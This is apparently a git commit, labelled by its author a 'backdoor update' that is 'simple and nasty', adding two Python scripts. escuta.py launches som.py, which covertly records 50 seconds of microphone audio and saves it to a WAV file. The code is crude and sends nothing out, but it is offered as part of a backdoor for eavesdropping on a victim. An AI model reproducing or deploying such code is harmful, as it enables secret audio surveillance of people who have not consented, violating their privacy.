fcf4a32e487e3ca11aff55491f7333e94c077201
unknow <rmdero_jr_@outlook.com>
2017-09-10 10:13:20 -0300

    Bill_Harper Backdoor Update, for now.
    simple and nasty.

---
+++ escuta.py
@@ -0,0 +1,15 @@
+#!/usr/bin python
+# -*- coding: utf-8 -*- 
+
+import sys,os, pyaudio, wave
+def escuta():
+
+    choice = 's'
+
+    if choice == "s":
+        os.system("python som.py")
+    pass
+
+if __name__ == '__main__':
+    escuta()
+    
---
+++ som.py
@@ -0,0 +1,41 @@
+#!/usr/bin python
+# -*- coding: utf-8 -*- 
+
+import pyaudio
+import wave
+ 
+FORMAT = pyaudio.paInt16
+CHANNELS = 2
+RATE = 44100
+CHUNK = 1024
+RECORD_SECONDS = 50
+WAVE_OUTPUT_FILENAME = "teste.wav"
+ 
+audio = pyaudio.PyAudio()
+ 
+# começa a gravação
+
+stream = audio.open(format=FORMAT, channels=CHANNELS,
+                rate=RATE, input=True,
+                frames_per_buffer=CHUNK)
+print "\n"
+frames = []
+ 
+for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+    data = stream.read(CHUNK)
+    frames.append(data)
+print "\n"
+ 
+ 
+# termina a gravação
+
+stream.stop_stream()
+stream.close()
+audio.terminate()
+ 
+waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
+waveFile.setnchannels(CHANNELS)
+waveFile.setsampwidth(audio.get_sample_size(FORMAT))
+waveFile.setframerate(RATE)
+waveFile.writeframes(b''.join(frames))
+waveFile.close()
